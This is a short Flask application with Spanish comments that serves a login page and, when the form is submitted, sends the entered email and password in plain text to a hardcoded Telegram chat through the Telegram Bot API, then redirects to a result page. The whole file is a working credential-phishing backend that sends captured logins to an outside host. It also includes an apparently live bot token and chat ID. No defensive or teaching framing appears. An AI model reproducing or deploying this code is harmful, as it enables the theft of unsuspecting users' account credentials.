from flask import Flask, request, render_template, redirect, url_for
import requests

app = Flask(__name__)

# Configuración del bot de Telegram
TELEGRAM_TOKEN = '8079607253:AAFVkKWRaIoskCdkIrhR3Mo03cNJzHvRs70'  #token de Telegram
CHAT_ID = '7406686831'  # ID de usuario

def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }

    response = requests.get(url, params=payload)  # Usar GET
    return response.json()

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    # Enviar mensaje a través de Telegram
    message = f'Correo electrónico: {email}\nContraseña: {password}'
    send_telegram_message(CHAT_ID, message)

    # Redirigir a la página de resultado
    return redirect(url_for('result'))

@app.route('/result')
def result():
    return render_template("result.html")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
